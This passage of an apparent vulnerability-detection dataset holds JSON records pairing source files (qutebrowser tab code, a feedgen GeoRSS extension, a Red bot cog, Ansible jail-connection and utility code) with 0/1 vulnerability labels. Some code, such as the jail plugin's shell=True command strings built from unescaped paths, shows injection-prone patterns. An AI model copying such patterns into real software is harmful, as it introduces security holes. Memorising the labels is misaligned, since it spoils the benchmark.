self.scroller._init_widget(widget)\n        self.caret._widget = widget\n        self.zoom._widget = widget\n        self.search._widget = widget\n        self.printing._widget = widget\n        self.action._widget = widget\n        self.elements._widget = widget\n        self.audio._widget = widget\n        self.private_api._widget = widget\n        self.settings._settings = widget.settings()\n\n        self._install_event_filter()\n        self.zoom.apply_default()\n\n    def _install_event_filter(self) -> None:\n        raise NotImplementedError\n\n    def _set_load_status(self, val: usertypes.LoadStatus) -> None:\n        \"\"\"Setter for load_status.\"\"\"\n        if not isinstance(val, usertypes.LoadStatus):\n            raise TypeError(\"Type {} is no LoadStatus member!\".format(val))\n        log.webview.debug(\"load status for {}: {}\".format(repr(self), val))\n        self._load_status = val\n        self.load_status_changed.emit(val)\n\n    def send_event(self, evt: QEvent) -> None:\n        \"\"\"Send the given event to the underlying widget.\n\n        The event will be sent via QApplication.postEvent.\n        Note that a posted event must not be re-used in any way!\n        \"\"\"\n        # This only gives us some mild protection against re-using events, but\n        # it's certainly better than a segfault.\n        if getattr(evt, 'posted', False):\n            raise utils.Unreachable(\"Can't re-use an event which was already \"\n                                    \"posted!\")\n\n        recipient = self.private_api.event_target()\n        if recipient is None:\n            # https://github.com/qutebrowser/qutebrowser/issues/3888\n            log.webview.warning(\"Unable to find event target!\")\n            return\n\n        evt.posted = True\n        QApplication.postEvent(recipient, evt)\n\n    def navigation_blocked(self) -> bool:\n        \"\"\"Test if navigation is allowed on the current tab.\"\"\"\n        return self.data.pinned and config.val.tabs.pinned.frozen\n\n    @pyqtSlot(QUrl)\n    def _on_before_load_started(self, url: QUrl) -> None:\n        \"\"\"Adjust the title if we are going to visit a URL soon.\"\"\"\n        qtutils.ensure_valid(url)\n        url_string = url.toDisplayString()\n        log.webview.debug(\"Going to start loading: {}\".format(url_string))\n        self.title_changed.emit(url_string)\n\n    @pyqtSlot(QUrl)\n    def _on_url_changed(self, url: QUrl) -> None:\n        \"\"\"Update title when URL has changed and no title is available.\"\"\"\n        if url.isValid() and not self.title():\n            self.title_changed.emit(url.toDisplayString())\n        self.url_changed.emit(url)\n\n    @pyqtSlot()\n    def _on_load_started(self) -> None:\n        self._progress = 0\n        self._has_ssl_errors = False\n        self.data.viewing_source = False\n        self._set_load_status(usertypes.LoadStatus.loading)\n        self.load_started.emit()\n\n    @pyqtSlot(usertypes.NavigationRequest)\n    def _on_navigation_request(\n            self,\n            navigation: usertypes.NavigationRequest\n    ) -> None:\n        \"\"\"Handle common acceptNavigationRequest code.\"\"\"\n        url = utils.elide(navigation.url.toDisplayString(), 100)\n        log.webview.debug(\"navigation request: url {}, type {}, is_main_frame \"\n                          \"{}\".format(url,\n                                      navigation.navigation_type,\n                                      navigation.is_main_frame))\n\n        if navigation.is_main_frame:\n            self.data.last_navigation = navigation\n\n        if not navigation.url.isValid():\n            # Also a WORKAROUND for missing IDNA 2008 support in QUrl, see\n            # https://bugreports.qt.io/browse/QTBUG-60364\n\n            if navigation.navigation_type == navigation.Type.link_clicked:\n                msg = urlutils.get_errstring(navigation.url,\n                                             \"Invalid link clicked\")\n                message.error(msg)\n                self.data.open_target = usertypes.ClickTarget.normal\n\n            log.webview.debug(\"Ignoring invalid URL {} in \"\n                              \"acceptNavigationRequest: {}\".format(\n                                  navigation.url.toDisplayString(),\n                                  navigation.url.errorString()))\n            navigation.accepted = False\n\n    @pyqtSlot(bool)\n    def _on_load_finished(self, ok: bool) -> None:\n        assert self._widget is not None\n        if sip.isdeleted(self._widget):\n            # https://github.com/qutebrowser/qutebrowser/issues/3498\n            return\n\n        if sessions.session_manager is not None:\n            sessions.session_manager.save_autosave()\n\n        self.load_finished.emit(ok)\n\n        if not self.title():\n            self.title_changed.emit(self.url().toDisplayString())\n\n        self.zoom.reapply()\n\n    def _update_load_status(self, ok: bool) -> None:\n        \"\"\"Update the load status after a page finished loading.\n\n        Needs to be called by subclasses to trigger a load status update, e.g.\n        as a response to a loadFinished signal.\n        \"\"\"\n        if ok and not self._has_ssl_errors:\n            if self.url().scheme() == 'https':\n                self._set_load_status(usertypes.LoadStatus.success_https)\n            else:\n                self._set_load_status(usertypes.LoadStatus.success)\n        elif ok:\n            self._set_load_status(usertypes.LoadStatus.warn)\n        else:\n            self._set_load_status(usertypes.LoadStatus.error)\n\n    @pyqtSlot()\n    def _on_history_trigger(self) -> None:\n        \"\"\"Emit history_item_triggered based on backend-specific signal.\"\"\"\n        raise NotImplementedError\n\n    @pyqtSlot(int)\n    def _on_load_progress(self, perc: int) -> None:\n        self._progress = perc\n        self.load_progress.emit(perc)\n\n    def url(self, *, requested: bool = False) -> QUrl:\n        raise NotImplementedError\n\n    def progress(self) -> int:\n        return self._progress\n\n    def load_status(self) -> usertypes.LoadStatus:\n        return self._load_status\n\n    def _load_url_prepare(self, url: QUrl, *,\n                          emit_before_load_started: bool = True) -> None:\n        qtutils.ensure_valid(url)\n        if emit_before_load_started:\n            self.before_load_started.emit(url)\n\n    def load_url(self, url: QUrl, *,\n                 emit_before_load_started: bool = True) -> None:\n        raise NotImplementedError\n\n    def reload(self, *, force: bool = False) -> None:\n        raise NotImplementedError\n\n    def stop(self) -> None:\n        raise NotImplementedError\n\n    def fake_key_press(self,\n                       key: Qt.Key,\n                       modifier: Qt.KeyboardModifier = Qt.NoModifier) -> None:\n        \"\"\"Send a fake key event to this tab.\"\"\"\n        press_evt = QKeyEvent(QEvent.KeyPress, key, modifier, 0, 0, 0)\n        release_evt = QKeyEvent(QEvent.KeyRelease, key, modifier,\n                                0, 0, 0)\n        self.send_event(press_evt)\n        self.send_event(release_evt)\n\n    def dump_async(self,\n                   callback: typing.Callable[[str], None], *,\n                   plain: bool = False) -> None:\n        \"\"\"Dump the current page's html asynchronously.\n\n        The given callback will be called with the result when dumping is\n        complete.\n        \"\"\"\n        raise NotImplementedError\n\n    def run_js_async(\n            self,\n            code: str,\n            callback: typing.Callable[[typing.Any], None] = None, *,\n            world: typing.Union[usertypes.JsWorld, int] = None\n    ) -> None:\n        \"\"\"Run javascript async.\n\n        The given callback will be called with the result when running JS is\n        complete.\n\n        Args:\n            code: The javascript code to run.\n            callback: The callback to call with the result, or None.\n            world: A world ID (int or usertypes.JsWorld member) to run the JS\n                   in the main world or in another isolated world.\n        \"\"\"\n        raise NotImplementedError\n\n    def title(self) -> str:\n        raise NotImplementedError\n\n    def icon(self) -> None:\n        raise NotImplementedError\n\n    def set_html(self, html: str, base_url: QUrl = QUrl()) -> None:\n        raise NotImplementedError\n\n    def __repr__(self) -> str:\n        try:\n            qurl = self.url()\n            url = qurl.toDisplayString(QUrl.EncodeUnicode)  # type: ignore\n        except (AttributeError, RuntimeError) as exc:\n            url = '<{}>'.format(exc.__class__.__name__)\n        else:\n            url = utils.elide(url, 100)\n        return utils.get_repr(self, tab_id=self.tab_id, url=url)\n\n    def is_deleted(self) -> bool:\n        assert self._widget is not None\n        return sip.isdeleted(self._widget)\n", "target": 1}
{"idx": 1053, "func": "# -*- coding: utf-8 -*-\n'''\n    feedgen.ext.geo_entry\n    ~~~~~~~~~~~~~~~~~~~\n\n    Extends the FeedGenerator to produce Simple GeoRSS feeds.\n\n    :copyright: 2017, Bob Breznak <bob.breznak@gmail.com>\n\n    :license: FreeBSD and LGPL, see license.* for more details.\n'''\nimport numbers\nimport warnings\n\nfrom feedgen.ext.base import BaseEntryExtension\nfrom feedgen.util import xml_elem\n\n\nclass GeoRSSPolygonInteriorWarning(Warning):\n    \"\"\"\n    Simple placeholder for warning about ignored polygon interiors.\n\n    Stores the original geom on a ``geom`` attribute (if required warnings are\n    raised as errors).\n    \"\"\"\n\n    def __init__(self, geom, *args, **kwargs):\n        self.geom = geom\n        super(GeoRSSPolygonInteriorWarning, self).__init__(*args, **kwargs)\n\n    def __str__(self):\n        return '{:d} interiors of polygon ignored'.format(\n            len(self.geom.__geo_interface__['coordinates']) - 1\n        )  # ignore exterior in count\n\n\nclass GeoRSSGeometryError(ValueError):\n    \"\"\"\n    Subclass of ValueError for a GeoRSS geometry error\n\n    Only some geometries are supported in Simple GeoRSS, so if not raise an\n    error. Offending geometry is stored on the ``geom`` attribute.\n    \"\"\"\n\n    def __init__(self, geom, *args, **kwargs):\n        self.geom = geom\n        super(GeoRSSGeometryError, self).__init__(*args, **kwargs)\n\n    def __str__(self):\n        msg = \"Geometry of type '{}' not in Point, Linestring or Polygon\"\n        return msg.format(\n            self.geom.__geo_interface__['type']\n        )\n\n\nclass GeoEntryExtension(BaseEntryExtension):\n    '''FeedEntry extension for Simple GeoRSS.\n    '''\n\n    def __init__(self):\n        '''Simple GeoRSS tag'''\n        # geometries\n        self.__point = None\n        self.__line = None\n        self.__polygon = None\n        self.__box = None\n\n        # additional properties\n        self.__featuretypetag = None\n        self.__relationshiptag = None\n        self.__featurename = None\n\n        # elevation\n        self.__elev = None\n        self.__floor = None\n\n        # radius\n        self.__radius = None\n\n    def extend_file(self, entry):\n        '''Add additional fields to an RSS item.\n\n        :param feed: The RSS item XML element to use.\n        '''\n\n        GEO_NS = 'http://www.georss.org/georss'\n\n        if self.__point:\n            point = xml_elem('{%s}point' % GEO_NS, entry)\n            point.text = self.__point\n\n        if self.__line:\n            line = xml_elem('{%s}line' % GEO_NS, entry)\n            line.text = self.__line\n\n        if self.__polygon:\n            polygon = xml_elem('{%s}polygon' % GEO_NS, entry)\n            polygon.text = self.__polygon\n\n        if self.__box:\n            box = xml_elem('{%s}box' % GEO_NS, entry)\n            box.text = self.__box\n\n        if self.__featuretypetag:\n            featuretypetag = xml_elem('{%s}featuretypetag' % GEO_NS, entry)\n            featuretypetag.text = self.__featuretypetag\n\n        if self.__relationshiptag:\n            relationshiptag = xml_elem('{%s}relationshiptag' % GEO_NS, entry)\n            relationshiptag.text = self.__relationshiptag\n\n        if self.__featurename:\n            featurename = xml_elem('{%s}featurename' % GEO_NS, entry)\n            featurename.text = self.__featurename\n\n        if self.__elev:\n            elevation = xml_elem('{%s}elev' % GEO_NS, entry)\n            elevation.text = str(self.__elev)\n\n        if self.__floor:\n            floor = xml_elem('{%s}floor' % GEO_NS, entry)\n            floor.text = str(self.__floor)\n\n        if self.__radius:\n            radius = xml_elem('{%s}radius' % GEO_NS, entry)\n            radius.text = str(self.__radius)\n\n        return entry\n\n    def extend_rss(self, entry):\n        return self.extend_file(entry)\n\n    def extend_atom(self, entry):\n        return self.extend_file(entry)\n\n    def point(self, point=None):\n        '''Get or set the georss:point of the entry.\n\n        :param point: The GeoRSS formatted point (i.e. \"42.36 -71.05\")\n        :returns: The current georss:point of the entry.\n        '''\n\n        if point is not None:\n            self.__point = point\n\n        return self.__point\n\n    def line(self, line=None):\n        '''Get or set the georss:line of the entry\n\n        :param point: The GeoRSS formatted line (i.e. \"45.256 -110.45 46.46\n                      -109.48 43.84 -109.86\")\n        :return: The current georss:line of the entry\n        '''\n        if line is not None:\n            self.__line = line\n\n        return self.__line\n\n    def polygon(self, polygon=None):\n        '''Get or set the georss:polygon of the entry\n\n        :param polygon: The GeoRSS formatted polygon (i.e. \"45.256 -110.45\n                        46.46 -109.48 43.84 -109.86 45.256 -110.45\")\n        :return: The current georss:polygon of the entry\n        '''\n        if polygon is not None:\n            self.__polygon = polygon\n\n        return self.__polygon\n\n    def box(self, box=None):\n        '''\n        Get or set the georss:box of the entry\n\n        :param box: The GeoRSS formatted box (i.e. \"42.943 -71.032 43.039\n                    -69.856\")\n        :return: The current georss:box of the entry\n        '''\n        if box is not None:\n            self.__box = box\n\n        return self.__box\n\n    def featuretypetag(self, featuretypetag=None):\n        '''\n        Get or set the georss:featuretypetag of the entry\n\n        :param featuretypetag: The GeoRSS feaaturertyptag (e.g. \"city\")\n        :return: The current georss:featurertypetag\n        '''\n        if featuretypetag is not None:\n            self.__featuretypetag = featuretypetag\n\n        return self.__featuretypetag\n\n    def relationshiptag(self, relationshiptag=None):\n        '''\n        Get or set the georss:relationshiptag of the entry\n\n        :param relationshiptag: The GeoRSS relationshiptag (e.g.\n                                \"is-centred-at\")\n        :return: the current georss:relationshiptag\n        '''\n        if relationshiptag is not None:\n            self.__relationshiptag = relationshiptag\n\n        return self.__relationshiptag\n\n    def featurename(self, featurename=None):\n        '''\n        Get or set the georss:featurename of the entry\n\n        :param featuretypetag: The GeoRSS featurename (e.g. \"Footscray\")\n        :return: the current georss:featurename\n        '''\n        if featurename is not None:\n            self.__featurename = featurename\n\n        return self.__featurename\n\n    def elev(self, elev=None):\n        '''\n        Get or set the georss:elev of the entry\n\n        :param elev: The GeoRSS elevation (e.g. 100.3)\n        :type elev: numbers.Number\n        :return: the current georss:elev\n        '''\n        if elev is not None:\n            if not isinstance(elev, numbers.Number):\n                raise ValueError(\"elev tag must be numeric: {}\".format(elev))\n\n            self.__elev = elev\n\n        return self.__elev\n\n    def floor(self, floor=None):\n        '''\n        Get or set the georss:floor of the entry\n\n        :param floor: The GeoRSS floor (e.g. 4)\n        :type floor: int\n        :return: the current georss:floor\n        '''\n        if floor is not None:\n            if not isinstance(floor, int):\n                raise ValueError(\"floor tag must be int: {}\".format(floor))\n\n            self.__floor = floor\n\n        return self.__floor\n\n    def radius(self, radius=None):\n        '''\n        Get or set the georss:radius of the entry\n\n        :param radius: The GeoRSS radius (e.g. 100.3)\n        :type radius: numbers.Number\n        :return: the current georss:radius\n        '''\n        if radius is not None:\n            if not isinstance(radius, numbers.Number):\n                raise ValueError(\n                    \"radius tag must be numeric: {}\".format(radius)\n                )\n\n            self.__radius = radius\n\n        return self.__radius\n\n    def geom_from_geo_interface(self, geom):\n        '''\n        Generate a georss geometry from some Python object with a\n        ``__geo_interface__`` property (see the `geo_interface specification by\n        Sean Gillies`_geointerface )\n\n        Note only a subset of GeoJSON (see `geojson.org`_geojson ) can be\n        easily converted to GeoRSS:\n\n        - Point\n        - LineString\n        - Polygon (if there are holes / donuts in the polygons a warning will\n          be generaated\n\n        Other GeoJson types will raise a ``ValueError``.\n\n        .. note:: The geometry is assumed to be x, y as longitude, latitude in\n           the WGS84 projection.\n\n        .. _geointerface: https://gist.github.com/sgillies/2217756\n        .. _geojson: https://geojson.org/\n\n        :param geom: Geometry object with a __geo_interface__ property\n        :return: the formatted GeoRSS geometry\n        '''\n        geojson = geom.__geo_interface__\n\n        if geojson['type'] not in ('Point', 'LineString', 'Polygon'):\n            raise GeoRSSGeometryError(geom)\n\n        if geojson['type'] == 'Point':\n\n            coords = '{:f} {:f}'.format(\n                geojson['coordinates'][1],  # latitude is y\n                geojson['coordinates'][0]\n            )\n            return self.point(coords)\n\n        elif geojson['type'] == 'LineString':\n\n            coords = ' '.join(\n                '{:f} {:f}'.format(vertex[1], vertex[0])\n                for vertex in\n                geojson['coordinates']\n            )\n            return self.line(coords)\n\n        elif geojson['type'] == 'Polygon':\n\n            if len(geojson['coordinates']) > 1:\n                warnings.warn(GeoRSSPolygonInteriorWarning(geom))\n\n            coords = ' '.join(\n                '{:f} {:f}'.format(vertex[1], vertex[0])\n                for vertex in\n                geojson['coordinates'][0]\n            )\n            return self.polygon(coords)\n", "target": 0}
{"idx": 1054, "func": "import functools\nimport random\nimport re\nfrom typing import Union\n\nimport aiohttp\nimport discord\nimport inflection\nfrom redbot.core import bot, Config, checks, commands\nfrom redbot.core.i18n import get_locale\nfrom redbot.core.utils.chat_formatting import italics\n\nfrom .helpers import *\n\nfmt_re = re.compile(r\"{(?:0|user)(?:\\.([^\\{]+))?}\")\n\n\nclass Act(commands.Cog):\n    \"\"\"\n    This cog makes all commands, e.g. [p]fluff, into valid commands if\n    you command the bot to act on a user, e.g. [p]fluff [botname].\n    \"\"\"\n\n    __author__ = \"Zephyrkul\"\n\n    async def red_get_data_for_user(self, *, user_id):\n        return {}  # No data to get\n\n    async def red_delete_data_for_user(self, *, requester, user_id):\n        pass  # No data to delete\n\n    def __init__(self, bot: bot.Red):\n        super().__init__()\n        self.bot = bot\n        self.config = Config.get_conf(self, identifier=2_113_674_295, force_registration=True)\n        self.config.register_global(custom={}, tenorkey=None)\n        self.config.register_guild(custom={})\n        self.try_after = None\n\n    async def initialize(self, bot: bot.Red):\n        # temporary backwards compatibility\n        key = await self.config.tenorkey()\n        if not key:\n            return\n        await bot.set_shared_api_tokens(\"tenor\", api_key=key)\n        await self.config.tenorkey.clear()\n\n    @staticmethod\n    def repl(target: discord.Member, match: re.Match):\n        if attr := match.group(1):\n            print(attr)\n            if attr.startswith(\"_\") or \".\" in attr:\n                return str(target)\n            try:\n                return str(getattr(target, attr))\n            except AttributeError:\n                return str(target)\n        return str(target)\n\n    @commands.command(hidden=True)\n    async def act(self, ctx: commands.Context, *, target: Union[discord.Member, str] = None):\n        \"\"\"\n        Acts on the specified user.\n        \"\"\"\n        if not target or isinstance(target, str):\n            return  # no help text\n\n        try:\n            if not ctx.guild:\n                raise KeyError()\n            message = await self.config.guild(ctx.guild).get_raw(\"custom\", ctx.invoked_with)\n        except KeyError:\n            try:\n                message = await self.config.get_raw(\"custom\", ctx.invoked_with)\n            except KeyError:\n                message = NotImplemented\n\n        if message is None:  # ignored command\n            return\n        elif message is NotImplemented:  # default\n            # humanize action text\n            action = inflection.humanize(ctx.invoked_with).split()\n            iverb = -1\n\n            for cycle in range(2):\n                if iverb > -1:\n                    break\n                for i, act in enumerate(action):\n                    act = act.lower()\n                    if (\n                        act in NOLY_ADV\n                        or act in CONJ\n                        or (act.endswith(\"ly\") and act not in LY_VERBS)\n                        or (not cycle and act in SOFT_VERBS)\n                    ):\n                        continue\n                    action[i] = inflection.pluralize(action[i])\n                    iverb = max(iverb, i)\n\n            if iverb < 0:\n                return\n            action.insert(iverb + 1, target.mention)\n            message = italics(\" \".join(action))\n        else:\n            assert isinstance(message, str)\n            message = fmt_re.sub(functools.partial(self.repl, target), message)\n\n        # add reaction gif\n        if self.try_after and ctx.message.created_at < self.try_after:\n            return await ctx.send(message)\n        if not await ctx.embed_requested():\n            return await ctx.send(message)\n        key = (await ctx.bot.get_shared_api_tokens(\"tenor\")).get(\"api_key\")\n        if not key:\n            return await ctx.send(message)\n        async with aiohttp.request(\n            \"GET\",\n            \"https://api.tenor.com/v1/search\",\n            params={\n                \"q\": ctx.invoked_with,\n                \"key\": key,\n                \"anon_id\": str(ctx.author.id ^ ctx.me.id),\n                \"media_filter\": \"minimal\",\n                \"contentfilter\": \"off\" if getattr(ctx.channel, \"nsfw\", False) else \"low\",\n                \"ar_range\": \"wide\",\n                \"limit\": \"8\",\n                \"locale\": get_locale(),\n            },\n        ) as response:\n            json: dict\n            if response.status == 429:\n                self.try_after = ctx.message.created_at + 30\n                json = {}\n            elif response.status >= 400:\n                json = {}\n            else:\n                json = await response.json()\n        if not json.get(\"results\"):\n            return await ctx.send(message)\n        message = f\"{message}\\n\\n{random.choice(json['results'])['itemurl']}\"\n        await ctx.send(\n            message,\n            allowed_mentions=discord.AllowedMentions(\n                users=False if target in ctx.message.mentions else [target]\n            ),\n        )\n\n    @commands.group()\n    @checks.is_owner()\n    async def actset(self, ctx: commands.Context):\n        \"\"\"\n        Configure various settings for the act cog.\n        \"\"\"\n\n    @actset.group(aliases=[\"custom\"], invoke_without_command=True)\n    @checks.admin_or_permissions(manage_guild=True)\n    @commands.guild_only()\n    async def customize(self, ctx: commands.Context, command: str.lower, *, response: str = None):\n        \"\"\"\n        Customize the response to an action.\n\n        You can use {0} or {user} to dynamically replace with the specified target of the action.\n        Formats like {0.name} or {0.mention} can also be used.\n        \"\"\"\n        if not response:\n            await self.config.guild(ctx.guild).clear_raw(\"custom\", command)\n            await ctx.tick()\n        else:\n            await self.config.guild(ctx.guild).set_raw(\"custom\", command, value=response)\n            await ctx.send(\n                fmt_re.sub(functools.partial(self.repl, ctx.author), response),\n                allowed_mentions=discord.AllowedMentions(users=False),\n            )\n\n    @customize.command(name=\"global\")\n    @checks.is_owner()\n    async def customize_global(\n        self, ctx: commands.Context, command: str.lower, *, response: str = None\n    ):\n        \"\"\"\n        Globally customize the response to an action.\n\n        You can use {0} or {user} to dynamically replace with the specified target of the action.\n        Formats like {0.name} or {0.mention} can also be used.\n        \"\"\"\n        if not response:\n            await self.config.clear_raw(\"custom\", command)\n        else:\n            await self.config.set_raw(\"custom\", command, value=response)\n        await ctx.tick()\n\n    @actset.group(invoke_without_command=True)\n    @checks.admin_or_permissions(manage_guild=True)\n    @commands.guild_only()\n    async def ignore(self, ctx: commands.Context, command: str.lower):\n        \"\"\"\n        Ignore or unignore the specified action.\n\n        The bot will no longer respond to these actions.\n        \"\"\"\n        try:\n            custom = await self.config.guild(ctx.guild).get_raw(\"custom\", command)\n        except KeyError:\n            custom = NotImplemented\n        if custom is None:\n            await self.config.guild(ctx.guild).clear_raw(\"custom\", command)\n            await ctx.send(\"I will no longer ignore the {command} action\".format(command=command))\n        else:\n            await self.config.guild(ctx.guild).set_raw(\"custom\", command, value=None)\n            await ctx.send(\"I will now ignore the {command} action\".format(command=command))\n\n    @ignore.command(name=\"global\")\n    @checks.is_owner()\n    async def ignore_global(self, ctx: commands.Context, command: str.lower):\n        \"\"\"\n        Globally ignore or unignore the specified action.\n\n        The bot will no longer respond to these actions.\n        \"\"\"\n        try:\n            await self.config.get_raw(\"custom\", command)\n        except KeyError:\n            await self.config.set_raw(\"custom\", command, value=None)\n        else:\n            await self.config.clear_raw(\"custom\", command)\n        await ctx.tick()\n\n    @actset.command()\n    @checks.is_owner()\n    async def tenorkey(self, ctx: commands.Context):\n        \"\"\"\n        Sets a Tenor GIF API key to enable reaction gifs with act commands.\n\n        You can obtain a key from here: https://tenor.com/developer/dashboard\n        \"\"\"\n        instructions = [\n            \"Go to the Tenor developer dashboard: https://tenor.com/developer/dashboard\",\n            \"Log in or sign up if you haven't already.\",\n            \"Click `+ Create new app` and fill out the form.\",\n            \"Copy the key from the app you just created.\",\n            \"Give the key to Red with this command:\\n\"\n            f\"`{ctx.prefix}set api tenor api_key your_api_key`\\n\"\n            \"Replace `your_api_key` with the key you just got.\\n\"\n            \"Everything else should be the same.\",\n        ]\n        instructions = [f\"**{i}.** {v}\" for i, v in enumerate(instructions, 1)]\n        await ctx.maybe_send_embed(\"\\n\".join(instructions))\n\n    @commands.Cog.listener()\n    async def on_command_error(\n        self, ctx: commands.Context, error: commands.CommandError, unhandled_by_cog: bool = False\n    ):\n        if ctx.command == self.act:\n            return\n        if isinstance(error, commands.UserFeedbackCheckFailure):\n            # UserFeedbackCheckFailure inherits from CheckFailure\n            return\n        elif isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):\n            ctx.command = self.act\n            await ctx.bot.invoke(ctx)\n", "target": 0}
{"idx": 1055, "func": "# Based on local.py (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>\n# and chroot.py     (c) 2013, Maykel Moya <mmoya@speedyrails.com>\n# (c) 2013, Michael Scherer <misc@zarb.org>\n# (c) 2015, Toshio Kuratomi <tkuratomi@ansible.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nimport distutils.spawn\nimport traceback\nimport os\nimport subprocess\nfrom ansible import errors\nfrom ansible.callbacks import vvv\nimport ansible.constants as C\n\nBUFSIZE = 4096\n\nclass Connection(object):\n    ''' Local BSD Jail based connections '''\n\n    def _search_executable(self, executable):\n        cmd = distutils.spawn.find_executable(executable)\n        if not cmd:\n            raise errors.AnsibleError(\"%s command not found in PATH\") % executable\n        return cmd\n\n    def list_jails(self):\n        p = subprocess.Popen([self.jls_cmd, '-q', 'name'],\n                             cwd=self.runner.basedir,\n                             stdin=subprocess.PIPE,\n                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n        stdout, stderr = p.communicate()\n\n        return stdout.split()\n\n    def get_jail_path(self):\n        p = subprocess.Popen([self.jls_cmd, '-j', self.jail, '-q', 'path'],\n                             cwd=self.runner.basedir,\n                             stdin=subprocess.PIPE,\n                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n        stdout, stderr = p.communicate()\n        # remove \\n\n        return stdout[:-1]\n\n \n        \n    def __init__(self, runner, host, port, *args, **kwargs):\n        self.jail = host\n        self.runner = runner\n        self.host = host\n        self.has_pipelining = False\n        self.become_methods_supported=C.BECOME_METHODS\n\n        if os.geteuid() != 0:\n            raise errors.AnsibleError(\"jail connection requires running as root\")\n\n        self.jls_cmd = self._search_executable('jls')\n        self.jexec_cmd = self._search_executable('jexec')\n        \n        if not self.jail in self.list_jails():\n            raise errors.AnsibleError(\"incorrect jail name %s\" % self.jail)\n\n\n        self.host = host\n        # port is unused, since this is local\n        self.port = port\n\n    def connect(self, port=None):\n        ''' connect to the jail; nothing to do here '''\n\n        vvv(\"THIS IS A LOCAL JAIL DIR\", host=self.jail)\n\n        return self\n\n    # a modifier\n    def _generate_cmd(self, executable, cmd):\n        if executable:\n            local_cmd = [self.jexec_cmd, self.jail, executable, '-c', cmd]\n        else:\n            local_cmd = '%s \"%s\" %s' % (self.jexec_cmd, self.jail, cmd)\n        return local_cmd\n\n    def _buffered_exec_command(self, cmd, tmp_path, become_user=None, sudoable=False, executable='/bin/sh', in_data=None, stdin=subprocess.PIPE):\n        ''' run a command on the jail.  This is only needed for implementing\n        put_file() get_file() so that we don't have to read the whole file\n        into memory.\n\n        compared to exec_command() it looses some niceties like being able to\n        return the process's exit code immediately.\n        '''\n\n        if sudoable and self.runner.become and self.runner.become_method not in self.become_methods_supported:\n            raise errors.AnsibleError(\"Internal Error: this module does not support running commands via %s\" % self.runner.become_method)\n\n        if in_data:\n            raise errors.AnsibleError(\"Internal Error: this module does not support optimized module pipelining\")\n\n        # Ignores privilege escalation\n        local_cmd = self._generate_cmd(executable, cmd)\n\n        vvv(\"EXEC %s\" % (local_cmd), host=self.jail)\n        p = subprocess.Popen(local_cmd, shell=isinstance(local_cmd, basestring),\n                             cwd=self.runner.basedir,\n                             stdin=stdin,\n                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n        return p\n\n    def exec_command(self, cmd, tmp_path, become_user=None, sudoable=False, executable='/bin/sh', in_data=None):\n        ''' run a command on the jail '''\n\n        p = self._buffered_exec_command(cmd, tmp_path, become_user, sudoable, executable, in_data)\n\n        stdout, stderr = p.communicate()\n        return (p.returncode, '', stdout, stderr)\n\n    def put_file(self, in_path, out_path):\n        ''' transfer a file from local to jail '''\n\n        vvv(\"PUT %s TO %s\" % (in_path, out_path), host=self.jail)\n\n        with open(in_path, 'rb') as in_file:\n            p = self._buffered_exec_command('dd of=%s' % out_path, None, stdin=in_file)\n            try:\n                stdout, stderr = p.communicate()\n            except:\n                traceback.print_exc()\n                raise errors.AnsibleError(\"failed to transfer file to %s\" % out_path)\n            if p.returncode != 0:\n                raise errors.AnsibleError(\"failed to transfer file to %s:\\n%s\\n%s\" % (out_path, stdout, stderr))\n\n    def fetch_file(self, in_path, out_path):\n        ''' fetch a file from jail to local '''\n\n        vvv(\"FETCH %s TO %s\" % (in_path, out_path), host=self.jail)\n\n\n        p = self._buffered_exec_command('dd if=%s bs=%s' % (in_path, BUFSIZE), None)\n\n        with open(out_path, 'wb+') as out_file:\n            try:\n                for chunk in p.stdout.read(BUFSIZE):\n                    out_file.write(chunk)\n            except:\n                traceback.print_exc()\n                raise errors.AnsibleError(\"failed to transfer file to %s\" % out_path)\n            stdout, stderr = p.communicate()\n            if p.returncode != 0:\n                raise errors.AnsibleError(\"failed to transfer file to %s:\\n%s\\n%s\" % (out_path, stdout, stderr))\n\n    def close(self):\n        ''' terminate the connection; nothing to do here '''\n        pass\n", "target": 0}
{"idx": 1056, "func": "# (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\nimport sys\nimport re\nimport os\nimport shlex\nimport yaml\nimport copy\nimport optparse\nimport operator\nfrom ansible import errors\nfrom ansible import __version__\nfrom ansible.utils import template\nfrom ansible.utils.display_functions import *\nfrom ansible.utils.plugins import *\nfrom ansible.callbacks import display\nimport ansible.constants as C\nimport ast\nimport time\nimport StringIO\nimport stat\nimport termios\nimport tty\nimport pipes\nimport random\nimport difflib\nimport warnings\nimport traceback\nimport getpass\nimport sys\nimport json\n\nfrom vault import VaultLib\n\nVERBOSITY=0\n\nMAX_FILE_SIZE_FOR_DIFF=1*1024*1024\n\n# caching the compilation of the regex used\n# to check for lookup calls within data\nLOOKUP_REGEX=re.compile(r'lookup\\s*\\(')\n\ntry:\n    import json\nexcept ImportError:\n    import simplejson as json\n\ntry:\n    from hashlib import md5 as _md5\nexcept ImportError:\n    from md5 import md5 as _md5\n\nPASSLIB_AVAILABLE = False\ntry:\n    import passlib.hash\n    PASSLIB_AVAILABLE = True\nexcept:\n    pass\n\ntry:\n    import builtin\nexcept ImportError:\n    import __builtin__ as builtin\n\nKEYCZAR_AVAILABLE=False\ntry:\n    try:\n        # some versions of pycrypto may not have this?\n        from Crypto.pct_warnings import PowmInsecureWarning\n    